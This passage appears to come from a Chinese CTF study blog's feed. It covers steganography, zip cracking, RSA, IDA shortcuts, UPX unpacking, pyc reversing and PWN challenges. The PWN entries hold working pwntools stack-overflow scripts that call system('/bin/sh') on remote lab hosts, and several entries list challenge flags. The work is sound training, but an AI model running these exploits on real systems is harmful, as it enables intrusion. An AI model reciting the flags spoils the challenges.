n)&#x3D;123<br>2️⃣加密运算<br>密钥:(d,n)&#x3D;(103,143)<br>明文：P&#x3D;c^d (mod n)&#x3D;85</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>感觉身上重重的</title>
      <link href="/2025/06/098257f0671a.html"/>
      <url>/2025/06/098257f0671a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/out.jpg"><br><img src="/images/Pastedimage20250604103412.png"><br>TZCFlag{copy_is_useful}<br>&#x3D;&#x3D;图片下面有字隐藏其实，用stegsolve&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/3411655f66f0.html"/>
      <url>/2025/06/3411655f66f0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/354DEABD-F725-4BE5-8E53-3E409F7E10FC.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>掩码</title>
      <link href="/2025/06/bb2621d41570.html"/>
      <url>/2025/06/bb2621d41570.html</url>
      
        <content type="html"><![CDATA[<p>小强找到自己的压箱底学习资料，但是发现有密码，他隐约记得密码是长 <code>AQ***g0**0</code>，中间 <code>*</code> 号只记得是小写字母和数字，你能帮他找回密码吗<br><img src="/images/Pastedimage20250604130116.png"><br><img src="/images/Pastedimage20250604130408.png">TZCFlag{th3_password_1s_s0_so_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暴力</title>
      <link href="/2025/06/bf9cbf41e4a4.html"/>
      <url>/2025/06/bf9cbf41e4a4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604125245.png"><br>TZCFlag{the_passw0rd_is_sooo_weak}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>明文</title>
      <link href="/2025/06/8a95981b2a01.html"/>
      <url>/2025/06/8a95981b2a01.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/57FCDD10-AE2B-4DBF-8DE9-1B19984A5445.png"><br>把pdf改成压缩包</p><p><img src="/images/Pastedimage20250604130730.png"><br><img src="/images/9FF4A261-2915-4D42-B8F4-FFA1CA8AB5E5.png"><br>有问题</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪加密</title>
      <link href="/2025/06/4b2a6ff1da24.html"/>
      <url>/2025/06/4b2a6ff1da24.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 压缩包 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/c540cc75b717.html"/>
      <url>/2025/06/c540cc75b717.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604133850.png"><br>错的</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 综合 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Banmabanma</title>
      <link href="/2025/06/4c2e0afe7e89.html"/>
      <url>/2025/06/4c2e0afe7e89.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 码类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hear with you eyes</title>
      <link href="/2025/06/f342c5c4709f.html"/>
      <url>/2025/06/f342c5c4709f.html</url>
      
        <content type="html"><![CDATA[<p>打开频谱图<br><img src="/images/2D31FA56-C817-4AC6-A587-C9008BA90B74.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/2025/06/fdd3a6b2e8b3.html"/>
      <url>/2025/06/fdd3a6b2e8b3.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf your_file.wav #从 WAV 文件中提取隐藏数据</span><br></pre></td></tr></table></figure><p><img src="/images/BEE0A87B-FE33-46DE-B36F-EB728163008C.png"><br>&#x3D;&#x3D;<strong>要转换的文件放在它的文件夹下</strong>&#x3D;&#x3D;<br><img src="/images/11E69F33-84F4-4962-A257-E294ED63D946.png"><br>TZCFlag{steghide_is_so_interesting}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>很普通的Disco</title>
      <link href="/2025/06/ff1c1e43f89c.html"/>
      <url>/2025/06/ff1c1e43f89c.html</url>
      
        <content type="html"><![CDATA[<p>放大<img src="/images/051C5CE7-A087-4021-8A67-CA44B66376DE.png"><br>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101<br>&#x3D;&#x3D;<strong>ASCII是7位</strong>&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string = &#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span><br><span class="line"> </span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(0, len(string), 7):</span><br><span class="line">    bin_str = string[i: i + 7]</span><br><span class="line">    flag += chr(int(bin_str, 2))</span><br><span class="line"> </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag{W0W*funny}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 音频 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32位</title>
      <link href="/2025/06/4857d55b1f10.html"/>
      <url>/2025/06/4857d55b1f10.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/0E02FF5F-B470-4DFF-ACBA-4AB58A61BF8E.png"><br><img src="/images/2574EBBA-F48A-4D4A-82BA-B370AF737470.png"><br><img src="/images/Pastedimage20250605202610.png"><br><img src="/images/Pastedimage20250605203003.png"><br><img src="/images/Pastedimage20250605205511.png"><br>这里 system 函数的地址：0x80483A0</p><p>这里将系统函数与参数分开了，我们需要手动构造，这是ROP？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line">b&#x27;a&#x27; * (0x12 + 4)：这部分是填充，填充的目的是使得输入的长度超过了原本的缓冲区大小，触发缓冲区溢出。</span><br><span class="line">p32(system)：这部分是 system 函数的地址，在利用缓冲区溢出漏洞时，重要的一步是覆盖返回地址，使得程序返回时跳转到 system 函数。</span><br><span class="line">p32(0)：这部分是 system 函数的第二个参数，在大多数情况下，system 函数的第二个参数应该是一个指向空值的指针，表示没有额外的参数，这里使用了0，表示一个空指针。</span><br><span class="line">p32(bin_sh)：这部分是 /bin/sh 字符串的地址，作为 system 函数的第一个参数，/bin/sh 是一个用于启动 shell 的路径，在利用缓冲区溢出漏洞时，我们可以使用这个参数来告诉 system 函数要执行的命令。</span><br></pre></td></tr></table></figure><p>首先在溢出后填入 system 函数的地址，这个地址将覆盖程序返回地址，以便控制程序流程。<br>此外我们需要考虑函数调用栈的结构：system函数的第一个参数通常是一个指向要执行的命令的字符串，如 &#x2F;bin&#x2F;sh，需要将这个字符串的地址作为参数传递给 system 函数，system 函数的第二个参数通常是一个指向空值的指针，表示没有额外的参数。在 payload 中，可以使用任意值，比如  0 ，使用 p32() 函数将地址转换为4字节的字符串，也可以用其他任意 4 字节字符，如 ‘aaaa’，最后再加上 bin&#x2F;sh 的地址，我们就能够利用缓冲区溢出漏洞成功调用 system(“&#x2F;bin&#x2F;sh”)，从而获取到所需的 shell。<br><img src="/images/24A745DD-622B-4D5D-89E0-A74989D98664.png"><br>&#x2F;bin&#x2F;sh 字符串的地址： 0x8048750</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">28118</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/E620E748-CEBD-4166-BD5C-889B55FC7B0C.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64位</title>
      <link href="/2025/06/8764702209e4.html"/>
      <url>/2025/06/8764702209e4.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/EDC60431-C7F0-4706-B7EE-C0C20022E216.png"><br><img src="/images/89BB9CEE-D6C5-4168-8559-A837556C9144.png"><br><img src="/images/Pastedimage20250605190959.png"><br>buf 到栈底（ebp）的距离是：0xA，64 位程序加上 8 字节的栈底（rbp）<br><img src="/images/Pastedimage20250605191047.png"><br>backdoor函数地址：0x400657<br>对于 32 位程序来说，现在就能打通了<br>但是这里是 64 位程序，需要处理堆栈平衡<br>#堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。<br>因此我们还需要找一个地址： lev 的地址或者该函数结束的地址（即 retn 的地址）<br>直接看 backdoor 函数的汇编代码：<br><img src="/images/Pastedimage20250605192121.png"><br>lev 的地址：0x40065B<br>retn 的地址：0x40066D<br><strong>特别注意：构造 payload 时将该地址放在该函数开始地址之前</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">55024</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40066D) + p64(0x400657) 可</span></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40065B) 也可以啊不是很懂</span></span><br></pre></td></tr></table></figure><p><img src="/images/BDC96406-6B8C-4852-90CC-38D5162440C3.png"></p><ol><li><code>p64(0x40065B)</code> → 覆盖返回地址为<code>0x40065B</code></li><li><code>p64(0x400657)</code> → 在栈上放置后门函数地址</li></ol><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当函数返回时：</p><ol><li>跳转到<code>0x40065B</code>（跳过函数开头的<code>push rbp; mov rbp, rsp</code>）</li><li>执行<code>lea rdi, command</code> → 设置好<code>system</code>的参数</li><li>执行<code>call _system</code> → 调用<code>system(&quot;/bin/sh&quot;)</code></li><li>执行<code>pop rbp</code> → 弹出栈顶值到RBP（此时栈顶是<code>0x400657</code>）</li><li>执行<code>retn</code> → 弹出栈顶值<code>0x400657</code>到RIP，跳转到后门函数开头</li></ol><h3 id="为什么要这样跳转两次？"><a href="#为什么要这样跳转两次？" class="headerlink" title="为什么要这样跳转两次？"></a>为什么要这样跳转两次？</h3><ol><li><strong>避免栈对齐问题</strong>：64位系统要求调用函数时栈指针16字节对齐<ul><li>直接跳转到<code>0x40065B</code>时，栈指针可能未对齐</li><li>第二次跳转到函数开头（<code>0x400657</code>）会执行<code>push rbp</code>，使栈对齐</li></ul></li><li><strong>确保参数正确设置</strong>：<ul><li>第一次跳转确保<code>rdi</code>正确设置为<code>&quot;/bin/sh&quot;</code></li><li>第二次跳转执行完整的<code>system</code>调用</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的眼睛能看到比较低的东西</title>
      <link href="/2025/06/b7489399e5c7.html"/>
      <url>/2025/06/b7489399e5c7.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/flag11.png"><br><img src="/images/B7FFEEE2-E071-41DC-A3E3-4BDA0719A462.png"><br><img src="/images/Pastedimage20250604104025.png"><br><img src="/images/Pastedimage20250604104046.png"><br><img src="/images/Pastedimage20250604105300.png"><br><img src="/images/3E1FFA08-BA9D-4AA5-8A9A-6D469456C255%7D.png"><br><img src="/images/CE52806F-ECC7-47DF-8A20-7224D63472F8.png"><br>cumtctf{1sb_i4_s0_Ea4y}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/7a81113665b5.html"/>
      <url>/2025/06/7a81113665b5.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/10D37E23-7399-4EDB-BFAE-C6662B1460E6.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/images/Pastedimage20250605162859.png"><br><img src="/images/Pastedimage20250605162923.png"><br><img src="/images/Pastedimage20250605160858.png"><br><img src="/images/3115B1EC-E572-40CA-94A3-ACD9DAAACB99.png"></p><h3 id="一、漏洞点分析"><a href="#一、漏洞点分析" class="headerlink" title="一、漏洞点分析"></a>一、漏洞点分析</h3><ol><li><strong><code>ctfshow</code> 函数的栈溢出</strong>：</li></ol> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>); <span class="comment">// 读取 0x32（50）字节到 14 字节的 buf → 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>缓冲区大小</strong>：<code>buff[14]</code> 实际占用14字节</li><li><strong>栈位置</strong>：<code>[ebp-12h]</code> (12h &#x3D; 18字节)</li><li><strong>读取长度</strong>：0x32u (50字节)</li></ol><h3 id="正确的偏移计算"><a href="#正确的偏移计算" class="headerlink" title="正确的偏移计算"></a>正确的偏移计算</h3><ol><li>从缓冲区开始到保存的EBP：<code>ebp - buff = 12h = 18字节</code></li><li>从保存的EBP到返回地址：返回地址位于<code>EBP+4</code>处，需要额外4字节</li><li><strong>总偏移</strong>：18字节(到EBP) + 4字节(覆盖EBP) &#x3D; 22字节</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程或远程连接</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn4&#x27;)  # 本地测试</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">53288</span>)  <span class="comment"># 远程攻击</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>+<span class="number">4</span>)        <span class="comment"># 填充18字节</span></span><br><span class="line">payload += p32(<span class="number">0x08048521</span>) <span class="comment"># 覆盖返回地址为backdoor</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)<span class="comment"># 发送payload</span></span><br><span class="line">p.interactive()<span class="comment"># 获取交互式shell</span></span><br></pre></td></tr></table></figure><p><img src="/images/AE10E247-E07F-4983-96FD-5C8A57C3DC35.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nc一下</title>
      <link href="/2025/06/74d642c7c583.html"/>
      <url>/2025/06/74d642c7c583.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../../../images/1ECE90F1-7E5D-47C4-AA43-FCEB3B41F7F6.png"><br>tzuctf{cf1a020b-4cf7-5909-30a0-8fc5a55e672c}</p><hr><p><img src="/../../../images/5EADDF48-2904-4B55-AA5D-F8B6B4859A141.png"><br>tzuctf{8b7f5b16-ce7c-adb6-7ae2-10006d2762d3}</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Netcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/7041daea1662.html"/>
      <url>/2025/06/7041daea1662.html</url>
      
        <content type="html"><![CDATA[<p>空格键：反汇编窗口切换文本跟图形</p><p>Esc：在反汇编窗口中使用为后退到上个操作的地址处</p><p>Shift +F5：打开签名窗口</p><p>shift+F12：自动分析出参考字符串</p><p>ALT+T：搜索字符串(文本搜索)</p><p>ALT+L：标记(Lable)</p><p>ALT+M：设置标签(mark)</p><p>ALT+G：转换局部变量为结构体</p><p>ALT+Enter：跳转到新的窗口</p><p>Alt+B：快捷键用于搜索十六进制字节序列，通常在分析过程中可以用来搜索opcode</p><p>CTRL+M：列举出当前已经添加的标签</p><p>CTRL+S列举出二进制程序的段的开始地址、结束地址、权限等信息</p><p>F9：动态调试程序(其实IDA主要用作静态分析用的)</p><p>F5：将一个函数逆向出来(生成c伪代码)</p><p>G：跳转到指定地址</p><p>A：将选择的信息转换成ASCII(转换成可读性跟强的字符串)</p><p>X(ctrl+X)：交叉引用,类似于OD中的栈回溯操作</p><p>N：对符号重命名</p><p>：&amp;；(冒号&amp;分号)：光标所在位置添加常规注释和可重复注释</p><p>P：创建函数</p><p>T：解析结构体偏移</p><p>M：转换为枚举类型常量</p><p>Y：设置变量类型</p><p>H：转换16进制</p><p>C：光标所在地址处的内容解析成代码</p><p>D：光标所在地址处的内容解析成数据</p><p>A：光标所在地址处的内容解析成ascll码字符串</p><p>U：光标所在地址处的内容解析成未定义内容。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/1d6a1034947c.html"/>
      <url>/2025/06/1d6a1034947c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/0b9e8826945d.html"/>
      <url>/2025/06/0b9e8826945d.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250605084443.png"><br>从 <code>Exeinfo PE</code> 的识别结果来看，文件 <code>re4</code> 是 <strong>PYO 格式</strong>（Python 优化编译后的字节码文件 ），不是常规的 PE 可执行程序（Windows EXE ）。由 Python 脚本编译生成（<code>python -O script.py</code> 命令会生成 <code>.pyo</code> ），比 <code>.pyc</code> 更小、加载更快，但可读性低。<br><img src="/images/Pastedimage20250605085914.png"><br><img src="/images/Pastedimage20250605085556.png"><br>这样提示文件打开是空白的<br><img src="/images/61B19F00-C9FE-410A-B85C-857D129B8E68.png"><br>这是正确的<br><img src="/images/Pastedimage20250605085613.png"><img src="/images/C6F9A70A-E2ED-427B-9929-BFAE4BBEE979.png"><br>&#x3D;&#x3D;<strong>要把文件后缀改成pyc</strong>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">message</span>):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>这个程序定义了一个<code>encode</code>函数，对输入字符串进行处理：</p><ol><li>每个字符的 ASCII 值与 32 进行异或操作</li><li>结果加 16</li><li>将处理后的字符组合成新字符串</li><li>对新字符串进行 Base64 编码<br>最后将编码结果与预定义的<code>correct</code>值进行比较。我们需要逆向这个过程来找到原始的 flag。</li></ol><h3 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h3><p>要还原 flag，我们需要反向执行上述步骤：</p><ol><li>对 Base64 编码进行解码</li><li>每个字符减 16</li><li>与 32 进行异或操作<br>下面是逆向的 Python 代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64 </span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27; </span><br><span class="line"># 第一步：Base64解码 </span><br><span class="line">decoded = base64.b64decode(correct) </span><br><span class="line"># 第二步：逆向处理每个字符 </span><br><span class="line">flag = &#x27;&#x27; </span><br><span class="line">for c in decoded: </span><br><span class="line"># Python3中需要处理字节对象 </span><br><span class="line">if isinstance(c, int): </span><br><span class="line">x = c </span><br><span class="line"># Python2中需要处理字节对象 </span><br><span class="line">else: </span><br><span class="line">x = ord(c) </span><br><span class="line">x = x - 16 </span><br><span class="line">x = x ^ 32 </span><br><span class="line">flag += chr(x) </span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>nctf{d3c0mpil1n9_PyC}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> PYC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/09ee5b3fb6a2.html"/>
      <url>/2025/06/09ee5b3fb6a2.html</url>
      
        <content type="html"><![CDATA[<p>好像加了什么东西？<br><img src="/images/95B1D75F-151D-4911-9152-2AAB97FC95D9.png"><br>从 <code>Exeinfo PE</code> 识别结果看，目标文件是 <strong>64 位 ELF 格式</strong>（非 Windows 可执行程序），且加了 <code>UPX</code> 壳 。</p><p>将脱壳的程序叫 re3和 upx.exe 放在同一目录：</p><ol><li><strong>查看壳信息</strong>（确认是 UPX 壳）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -l re3</span><br></pre></td></tr></table></figure>输出会显示 <code>UPX</code> 版本、压缩率等，确认是 UPX 壳再继续。</li><li><strong>执行脱壳</strong>：</li></ol><pre><code>  upx.exe -d re3.exe  ```    - 成功提示：`Unpacked 1 file...`  - 失败提示：`Not packed by UPX`（说明不是 UPX 壳，换其他工具 ）![](images//assets/images/&#123;2641DC93-B260-4C2C-95F1-CFB5B93000BD&#125;.png)![](images//assets/images/Pasted image 20250604161619.png)![](images//assets/images/Pasted image 20250604161706.png)</code></pre>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> UPX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/fbf65d286087.html"/>
      <url>/2025/06/fbf65d286087.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/d15a555fb50a.html"/>
      <url>/2025/06/d15a555fb50a.html</url>
      
        <content type="html"><![CDATA[<p>shift+F12+Fn搜索flag<br><img src="/images/Pastedimage20250604153708.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>source</title>
      <link href="/2025/06/5e1bd234a6b7.html"/>
      <url>/2025/06/5e1bd234a6b7.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">int main(int argc, char *argv[]) &#123; </span><br><span class="line">if (argc != 4) &#123; </span><br><span class="line">printf(&quot;what?\n&quot;); </span><br><span class="line">exit(1); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int first = atoi(argv[1]);</span><br><span class="line">if (first != 0xcafe) &#123; </span><br><span class="line">printf(&quot;you are wrong, sorry.\n&quot;); </span><br><span class="line">exit(2);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int second = atoi(argv[2]); </span><br><span class="line">if (second % 5 == 3 || second % 17 != 8) &#123; </span><br><span class="line">printf(&quot;ha, you won&#x27;t get it!\n&quot;); </span><br><span class="line">exit(3); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123; </span><br><span class="line">printf(&quot;so close, dude!\n&quot;); </span><br><span class="line">exit(4); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">printf(&quot;Brr wrrr grr\n&quot;); </span><br><span class="line"></span><br><span class="line">unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; </span><br><span class="line">printf(&quot;Get your key: &quot;); </span><br><span class="line">printf(&quot;%x\n&quot;, hash); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" 